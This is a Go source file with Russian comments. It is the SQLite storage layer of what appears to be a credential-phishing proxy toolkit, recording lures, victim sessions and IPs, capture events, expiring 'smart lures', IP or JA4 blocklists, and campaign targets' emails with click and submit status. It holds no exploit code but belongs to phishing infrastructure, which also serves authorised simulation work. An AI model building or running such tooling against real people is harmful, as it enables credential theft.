package sqlite

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
)

// DAO — только факты, без plaintext (vault отклонен решением).
func (d *DB) InsertLure(phishletID, path string) error {
	_, err := d.sql.Exec(`INSERT OR IGNORE INTO lures(id,phishlet_id,path,created_at) VALUES(?,?,?,?)`,
		uuid.NewString(), phishletID, path, time.Now().Unix())
	return err
}

func (d *DB) InsertSession(id, phishletID, ip string) error {
	_, err := d.sql.Exec(`INSERT OR IGNORE INTO sessions(id,phishlet_id,ip,created_at) VALUES(?,?,?,?)`,
		id, phishletID, ip, time.Now().Unix())
	return err
}

func (d *DB) InsertCapture(sessionID, kind string) error {
	return d.InsertCaptureNode(sessionID, kind, "")
}

// InsertCaptureNode пишет факт захвата с node_id (мульти-нода).
func (d *DB) InsertCaptureNode(sessionID, kind, node string) error {
	_, err := d.sql.Exec(`INSERT INTO captures(id,session_id,kind,created_at,node) VALUES(?,?,?,?,?)`,
		uuid.NewString(), sessionID, kind, time.Now().Unix(), node)
	return err
}

func (d *DB) InsertBlock(key, reason string) error {
	_, err := d.sql.Exec(`INSERT OR REPLACE INTO blacklist(ip_or_ja4,reason) VALUES(?,?)`, key, reason)
	return err
}

func (d *DB) ListLures() (map[string]string, error) {
	rows, err := d.sql.Query(`SELECT phishlet_id,path FROM lures`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var pid, path string
		if err := rows.Scan(&pid, &path); err != nil {
			return nil, err
		}
		out[path] = pid
	}
	return out, rows.Err()
}

func (d *DB) ListBlocks() (map[string]string, error) {
	rows, err := d.sql.Query(`SELECT ip_or_ja4,reason FROM blacklist`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var k, r string
		if err := rows.Scan(&k, &r); err != nil {
			return nil, err
		}
		out[k] = r
	}
	return out, rows.Err()
}

func (d *DB) CountCaptures() (int, error) {
	var n int
	err := d.sql.QueryRow(`SELECT COUNT(*) FROM captures`).Scan(&n)
	return n, err
}

// SmartLureRow — строка smart-приманки.
type SmartLureRow struct {
	Path             string
	PhishletID       string
	ExpiresAt        int64
	MaxUses          int
	Uses             int
	BoundIP          string
	RequireChallenge bool
	RedirectURL      string
}

func (d *DB) UpsertSmartLure(r SmartLureRow) error {
	_, err := d.sql.Exec(`INSERT INTO smart_lures(path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge,redirect_url)
VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(path) DO UPDATE SET phishlet_id=excluded.phishlet_id,expires_at=excluded.expires_at,max_uses=excluded.max_uses,bound_ip=excluded.bound_ip,require_challenge=excluded.require_challenge,redirect_url=excluded.redirect_url`,
		r.Path, r.PhishletID, r.ExpiresAt, r.MaxUses, r.Uses, r.BoundIP, boolInt(r.RequireChallenge), r.RedirectURL)
	return err
}

func (d *DB) ListSmartLures() ([]SmartLureRow, error) {
rows, err := d.sql.Query(`SELECT path,phishlet_id,expires_at,max_uses,uses,bound_ip,require_challenge,redirect_url FROM smart_lures`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []SmartLureRow
	for rows.Next() {
var r SmartLureRow
		var rc int
		if err := rows.Scan(&r.Path, &r.PhishletID, &r.ExpiresAt, &r.MaxUses, &r.Uses, &r.BoundIP, &rc, &r.RedirectURL); err != nil {
			return nil, err
		}
		r.RequireChallenge = rc != 0
		out = append(out, r)
	}
	return out, rows.Err()
}

func boolInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

// Domain presets — сохраненные домены для выбора из списка (меню).
func (d *DB) AddDomainPreset(domain string) error {
	domain = strings.ToLower(strings.TrimSpace(domain))
	if !strings.Contains(domain, ".") || strings.ContainsAny(domain, " \t/") {
		return fmt.Errorf("bad domain %q", domain)
	}
	_, err := d.sql.Exec(`INSERT OR IGNORE INTO domain_presets(domain,created_at) VALUES(?,?)`,
		domain, time.Now().Unix())
	return err
}

func (d *DB) ListDomainPresets() ([]string, error) {
	rows, err := d.sql.Query(`SELECT domain FROM domain_presets ORDER BY domain`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []string
	for rows.Next() {
		var s string
		if err := rows.Scan(&s); err != nil {
			return nil, err
		}
		out = append(out, s)
	}
	return out, rows.Err()
}

func (d *DB) RemoveDomainPreset(domain string) error {
	domain = strings.ToLower(strings.TrimSpace(domain))
	_, err := d.sql.Exec(`DELETE FROM domain_presets WHERE domain=?`, domain)
	return err
}

// CaptureRow — факт захвата для витрины (без plaintext по дизайну).
type CaptureRow struct {
	ID        string
	SessionID string
	Kind      string
	Node      string
	CreatedAt int64
}

// ListCaptures — последние N фактов, новые сверху.
func (d *DB) ListCaptures(limit int) ([]CaptureRow, error) {
	if limit <= 0 || limit > 200 {
		limit = 50
	}
	rows, err := d.sql.Query(`SELECT id,session_id,kind,COALESCE(node,''),created_at FROM captures ORDER BY created_at DESC LIMIT ?`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []CaptureRow
	for rows.Next() {
		var r CaptureRow
		if err := rows.Scan(&r.ID, &r.SessionID, &r.Kind, &r.Node, &r.CreatedAt); err != nil {
			return nil, err
		}
		out = append(out, r)
	}
	return out, rows.Err()
}

// Campaign persistence (без plaintext: только факты и счетчики).
func (d *DB) UpsertCampaign(id, name, phishletID, status string, ttlMin, maxUses int, createdAt int64) error {
	return d.UpsertCampaignStop(id, name, phishletID, status, ttlMin, maxUses, createdAt, 0)
}

// UpsertCampaignStop пишет кампанию с дедлайном авто-стопа.
func (d *DB) UpsertCampaignStop(id, name, phishletID, status string, ttlMin, maxUses int, createdAt, stopAt int64) error {
	_, err := d.sql.Exec(`INSERT INTO campaigns(id,name,phishlet_id,ttl_min,max_uses,status,created_at,stop_at)
VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET status=excluded.status,stop_at=excluded.stop_at`,
		id, name, phishletID, ttlMin, maxUses, status, createdAt, stopAt)
	return err
}

func (d *DB) UpsertTarget(id, campaignID, email, lure string, sent, opened, clicked, submitted bool) error {
	_, err := d.sql.Exec(`INSERT INTO targets(id,campaign_id,email,lure,sent,opened,clicked,submitted)
VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET sent=excluded.sent,opened=excluded.opened,clicked=excluded.clicked,submitted=excluded.submitted`,
		id, campaignID, email, lure, boolInt(sent), boolInt(opened), boolInt(clicked), boolInt(submitted))
	return err
}

type CampaignRow struct {
	ID, Name, PhishletID, Status string
	TTLMin, MaxUses               int
	CreatedAt                     int64
	StopAt                        int64
}

type TargetRow struct {
	ID, CampaignID, Email, Lure string
	Sent, Opened, Clicked, Submitted bool
}

func (d *DB) ListCampaigns() ([]CampaignRow, []TargetRow, error) {
	rows, err := d.sql.Query(`SELECT id,name,phishlet_id,ttl_min,max_uses,status,created_at,COALESCE(stop_at,0) FROM campaigns`)
	if err != nil {
		return nil, nil, err
	}
	defer rows.Close()
	var camps []CampaignRow
	for rows.Next() {
		var c CampaignRow
		if err := rows.Scan(&c.ID, &c.Name, &c.PhishletID, &c.TTLMin, &c.MaxUses, &c.Status, &c.CreatedAt, &c.StopAt); err != nil {
			return nil, nil, err
		}
		camps = append(camps, c)
	}
	if err := rows.Err(); err != nil {
		return nil, nil, err
	}
	rows2, err := d.sql.Query(`SELECT id,campaign_id,email,lure,sent,opened,clicked,submitted FROM targets`)
	if err != nil {
		return nil, nil, err
	}
	defer rows2.Close()
	var tgts []TargetRow
	for rows2.Next() {
		var t TargetRow
		var s, o, c2, sb int
		if err := rows2.Scan(&t.ID, &t.CampaignID, &t.Email, &t.Lure, &s, &o, &c2, &sb); err != nil {
			return nil, nil, err
		}
		t.Sent, t.Opened, t.Clicked, t.Submitted = s != 0, o != 0, c2 != 0, sb != 0
		tgts = append(tgts, t)
	}
	return camps, tgts, rows2.Err()
}

// IncSmartUse атомарно +1 к счетчику использований (one-time выживают рестарт).
func (d *DB) IncSmartUse(path string) error {
	_, err := d.sql.Exec(`UPDATE smart_lures SET uses = uses + 1 WHERE path=?`, path)
	return err
}
